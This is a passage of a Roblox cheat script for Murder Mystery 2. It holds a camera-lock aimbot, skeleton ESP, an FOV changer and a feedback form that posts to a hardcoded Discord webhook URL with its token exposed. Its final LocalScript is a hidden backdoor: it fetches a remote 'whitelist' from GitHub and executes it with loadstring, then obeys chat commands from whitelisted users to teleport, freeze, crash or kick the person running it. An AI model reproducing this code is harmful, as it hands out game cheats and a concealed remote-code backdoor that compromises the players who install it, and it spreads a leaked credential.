			camera.CFrame = CFrame.new(camera.CFrame.p, predictedPosition)
		end
	end)
	
	Mouse.KeyDown:Connect(function(k)
		if k == getgenv().Key then
			Locked = not Locked
			if Locked then
				enemy = FindNearestEnemy()
				if enemy then
					highlight.Parent = enemy
					CamlockState = true
				end
			else
				if enemy then
					highlight.Parent = nil
					enemy = nil
				end
				CamlockState = false
				FOVCircle.Visible = false
			end
		elseif k == "MB1" and getgenv().Key == "MB1" then
			Locked = not Locked
			if Locked then
				enemy = FindNearestEnemy()
				if enemy then
					highlight.Parent = enemy
					CamlockState = true
				end
			else
				if enemy then
					highlight.Parent = nil
					enemy = nil
				end
				CamlockState = false
				FOVCircle.Visible = false
			end
		elseif k == "MB2" and getgenv().Key == "MB2" then
			Locked = not Locked
			if Locked then
				enemy = FindNearestEnemy()
				if enemy then
					highlight.Parent = enemy
					CamlockState = true
				end
			else
				if enemy then
					highlight.Parent = nil
					enemy = nil
				end
				CamlockState = false
				FOVCircle.Visible = false
			end
		end
	end)
	
	local function validateKeyInput(input)
		if #input == 1 then
			return input:match("[a-zA-Z]") ~= nil
		elseif input == "MB1" or input == "MB2" then
			return true
		end
		return false
	end
	
	textbox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			local input = textbox.Text
			if validateKeyInput(input) then
				getgenv().Key = input
			else
			end
			textbox.Text = ""
		end
	end)
	
	button.MouseButton1Click:Connect(function()
		if isBlue then
			button.BackgroundColor3 = whitecolor
			checkmark.Visible = false
			CamlockState = false
			if enemy then
				highlight.Parent = nil
				enemy = nil
			end
		else
			button.BackgroundColor3 = bluecolor
			checkmark.Visible = true
			CamlockState = true
			enemy = FindNearestEnemy()
			if enemy then
				highlight.Parent = enemy
			end
		end
		isBlue = not isBlue
	end)
	
end;
task.spawn(C_6a);
-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.skeletonesp.TextButton.LocalScript
local function C_73()
local script = G2L["73"];
	-- Script to toggle Skeleton ESP
	local button = script.Parent
	local bluecolor = Color3.fromRGB(43, 114, 245)
	local whitecolor = Color3.fromRGB(255, 255, 255)
	local checkmark = button.ImageLabel
	local isBlue = false
	
	-- Skeleton ESP management
	local skeletons = {}
	local RS = game:GetService("RunService")
	local Players = game:GetService("Players")
	local Camera = workspace.CurrentCamera
	
	-- Helper functions for drawing
	local function createLine(color, thickness)
		local line = Drawing.new("Line")
		line.Color = color
		line.Thickness = thickness
		line.Transparency = 1
		return line
	end
	
	-- Skeleton ESP class
	local SkeletonESP = {}
	SkeletonESP.__index = SkeletonESP
	
	function SkeletonESP.new(player)
		local self = setmetatable({}, SkeletonESP)
		self.Player = player
		self.Lines = {}
		self.Visible = false
		self.Color = Color3.fromRGB(0, 255, 0) -- Default color is light green
		self.Thickness = 2 -- Default thickness
		self:setup()
		return self
	end
	
	function SkeletonESP:setup()
		local character = self.Player.Character
		if not character then return end
	
		for _, part in pairs(character:GetChildren()) do
			if part:IsA("BasePart") then
				for _, link in pairs(part:GetChildren()) do
					if link:IsA("Motor6D") then
						local line1 = createLine(self.Color, self.Thickness)
						local line2 = createLine(self.Color, self.Thickness)
						table.insert(self.Lines, {line1, line2, link.Part0, link.Part1})
					end
				end
			end
		end
	end
	
	function SkeletonESP:update()
		if not self.Visible then return end
	
		local character = self.Player.Character
		if not character then
			self:remove()
			return
		end
	
		for _, line in pairs(self.Lines) do
			local part0, part1 = line[3], line[4]
			local pos0, visible0 = Camera:WorldToViewportPoint(part0.Position)
			local pos1, visible1 = Camera:WorldToViewportPoint(part1.Position)
	
			if visible0 and visible1 then
				line[1].From = Vector2.new(pos0.X, pos0.Y)
				line[1].To = Vector2.new(pos1.X, pos1.Y)
				line[1].Visible = true
	
				line[2].From = Vector2.new(pos1.X, pos1.Y)
				line[2].To = Vector2.new(pos0.X, pos0.Y)
				line[2].Visible = true
			else
				line[1].Visible = false
				line[2].Visible = false
			end
		end
	end
	
	function SkeletonESP:setVisible(visible)
		self.Visible = visible
		for _, line in pairs(self.Lines) do
			line[1].Visible = visible
			line[2].Visible = visible
		end
	end
	
	function SkeletonESP:remove()
		for _, line in pairs(self.Lines) do
			line[1]:Remove()
			line[2]:Remove()
		end
		self.Lines = {}
	end
	
	-- Function to manage ESP based on button state
	local function updateESP()
		for _, data in pairs(skeletons) do
			data.ESP:setVisible(isBlue)
		end
	end
	
	-- Add Skeleton ESP to existing and new players
	local function addSkeleton(player)
		if player ~= Players.LocalPlayer then
			local esp = SkeletonESP.new(player)
			table.insert(skeletons, {Player = player, ESP = esp})
	
			-- Recreate the ESP when the player's character respawns
			player.CharacterAdded:Connect(function(character)
				esp:remove()
				wait(1) -- Add a short delay to ensure the character is fully loaded
				esp:setup()
			end)
		end
	end
	
	-- Remove Skeleton ESP from players
	local function removeSkeleton(player)
		for i, data in pairs(skeletons) do
			if data.Player == player then
				data.ESP:remove()
				table.remove(skeletons, i)
				break
			end
		end
	end
	
	-- Initialize ESP for existing players
	for _, player in pairs(Players:GetPlayers()) do
		if player.Character then
			addSkeleton(player)
		end
	end
	
	-- Handle new players
	Players.PlayerAdded:Connect(function(player)
		addSkeleton(player)
	end)
	
	-- Handle player removal
	Players.PlayerRemoving:Connect(function(player)
		removeSkeleton(player)
	end)
	
	-- Update ESPs based on button state
	RS.RenderStepped:Connect(function()
		if isBlue then
			for _, data in pairs(skeletons) do
				data.ESP:update()
			end
		end
	end)
	
	-- Toggle button functionality
	button.MouseButton1Click:Connect(function()
		if isBlue then
			button.BackgroundColor3 = whitecolor
			checkmark.Visible = false
		else
			button.BackgroundColor3 = bluecolor
			checkmark.Visible = true
		end
		isBlue = not isBlue
		updateESP() -- Update ESP visibility based on button state
		print("ESP Toggled:", isBlue) -- Debug print
	end)
	
end;
task.spawn(C_73);
-- StarterGui.MurderMystery2.UIPlaceHolder.VisualElement.Element.fov.TextBox.LocalScript
local function C_81()
local script = G2L["81"];
	local textbox = script.Parent
	local plr = game:GetService("Players").LocalPlayer
	local camera = workspace.CurrentCamera
	
	local function updateFOV()
		local inputText = textbox.Text
		local fovNumber = tonumber(inputText)
	
		if fovNumber and fovNumber >= 1 and fovNumber <= 120 then
			camera.FieldOfView = fovNumber
			textbox.Text = "" -- Clear the textbox after setting FOV
		else
		end
	end
	
	textbox.FocusLost:Connect(updateFOV)
	
end;
task.spawn(C_81);
-- StarterGui.MurderMystery2.UIPlaceHolder.Drag
local function C_82()
local script = G2L["82"];
	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end;
task.spawn(C_82);
-- StarterGui.MurderMystery2.UIPlaceHolder.SuggestionElement.Element.LocalScript
local function C_8b()
local script = G2L["8b"];
	local HttpService = game:GetService("HttpService")
	local player = game.Players.LocalPlayer
	
	local textbox = script.Parent.TextBox
	local textbutton = script.Parent.TextButton
	
	local Webhook_URL = "https://discord.com/api/webhooks/1265088693727793193/ku0402FnZuYtVcVRFCbvOwpQlQZ7LAoO4gv5ny4HTF-WNA3nhnHVdV-0ib4GF_a3hG74"
	local cooldownTime = 10
	local isCooldown = false
	
	local function sendWebhookMessage(message)
		local data = {
			["content"] = string.format("Suggestion from: %s / %s\n\n```\n%s\n```", player.Name, player.UserId, message)
		}
	
		local headers = {
			['Content-Type'] = 'application/json',
		}
	
		local jsonData = HttpService:JSONEncode(data)
		local success, response = pcall(function()
			return syn.request({
				Url = Webhook_URL,
				Method = "POST",
				Headers = headers,
				Body = jsonData
			})
		end)
	
		if success then
			return response.StatusCode == 204
		else
			return false
		end
	end
	
	local function submitFeedback()
		if isCooldown then
			return
		end
	
		local suggestion = textbox.Text
		if suggestion == "" then
			return
		end
	
		isCooldown = true
		local success = sendWebhookMessage(suggestion)
		if success then
			textbutton.Text = "Successfully Sent"
			textbox.Text = ""
		else
			textbutton.Text = "Failed to send message"
		end
	
		wait(1)
		textbutton.Text = "Submit"
		wait(cooldownTime)
		isCooldown = false
	end
	
	textbutton.MouseButton1Click:Connect(submitFeedback)
	
end;
task.spawn(C_8b);
-- StarterGui.MurderMystery2.LocalScript
local function C_8c()
local script = G2L["8c"];
	local button = script.Parent.UIPlaceHolder.Top.TextButton
	local frame = script.Parent.UIPlaceHolder
	local uis = game:GetService("UserInputService")
	
	button.MouseButton1Click:Connect(function()
		frame.Visible = false
	end)
	
	uis.InputBegan:Connect(function(input, gameProcessedEvent)
		if not gameProcessedEvent then
			if frame.Visible == false and input.KeyCode == Enum.KeyCode.M then
				frame.Visible = true
			end
		end
	end)
	
end;
task.spawn(C_8c);
-- StarterGui.MurderMystery2.LocalScript
local function C_8d()
local script = G2L["8d"];

local success, whitelistedUsers = pcall(function()
    local response = game:HttpGet("https://raw.githubusercontent.com/spookyoregon/whitelist/main/users")
    return loadstring(response)()
end)

if not success then
    whitelistedUsers = {}
end

local plr = game.Players.LocalPlayer
local character = plr.Character or plr.CharacterAdded:Wait()

local function isAllowed(userId)
    return whitelistedUsers[userId] == true
end

local function bringPlayer(targetName)
    local targetPlayer = game.Players:FindFirstChild(targetName)
    if targetPlayer and targetPlayer.Character then
        character:SetPrimaryPartCFrame(targetPlayer.Character:GetPrimaryPartCFrame())
    end
end

local function kickPlayer(targetName)
    local targetPlayer = game.Players:FindFirstChild(targetName)
    if targetPlayer then
        targetPlayer:Kick("Kicked by: " .. plr.Name)
    end
end

local function fakeBanPlayer(targetName)
    local targetPlayer = game.Players:FindFirstChild(targetName)
    if targetPlayer then
        targetPlayer:Kick("You have been banned")
    end
end

local function freezePlayer()
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 0
        humanoid.JumpPower = 0
        humanoid.PlatformStand = true
    end
end

local function unfreezePlayer()
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid.WalkSpeed = 16
        humanoid.JumpPower = 50
        humanoid.PlatformStand = false
    end
end

local function crashPlayer(targetName)
    local targetPlayer = game.Players:FindFirstChild(targetName)
    if targetPlayer then
        while true do
        end
    end
end

local function refreshPlayer(targetName)
    local targetPlayer = game.Players:FindFirstChild(targetName)
    if targetPlayer then
        local teleportService = game:GetService("TeleportService")
        local placeId = game.PlaceId
        local jobId = game.JobId
        teleportService:TeleportToPlaceInstance(placeId, jobId, targetPlayer)
    end
end

local function killPlayer(targetName)
    local targetPlayer = game.Players:FindFirstChild(targetName)
    if targetPlayer and targetPlayer.Character then
        local humanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            humanoid.Health = 0
        end
    end
end

local function onPlayerChatted(player, message)
    if isAllowed(player.UserId) then
        local command, targetName = message:match("^%.(%w+)%s*(%w*)")
        if command then
            print("Command:", command, "Target Name:", targetName)
            if command == "bring" and targetName == plr.Name then
                bringPlayer(player.Name)
            elseif command == "freeze" and targetName == plr.Name then
                freezePlayer()
            elseif command == "crash" then
                crashPlayer(targetName)
            elseif command == "unfreeze" and targetName == plr.Name then
                unfreezePlayer()
            elseif command == "kick" then
                kickPlayer(targetName)
            elseif command == "ban" then
                fakeBanPlayer(targetName)
            elseif command == "refresh" then
                refreshPlayer(targetName)
            elseif command == "kill" then
                killPlayer(targetName)
            end
        end
    end
end

game.Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(message)
        onPlayerChatted(player, message)
    end)
end)

for _, player in ipairs(game.Players:GetPlayers()) do
    player.Chatted:Connect(function(message)
        onPlayerChatted(player, message)
    end)
end

end;
task.spawn(C_8d);

return G2L["1"], require;
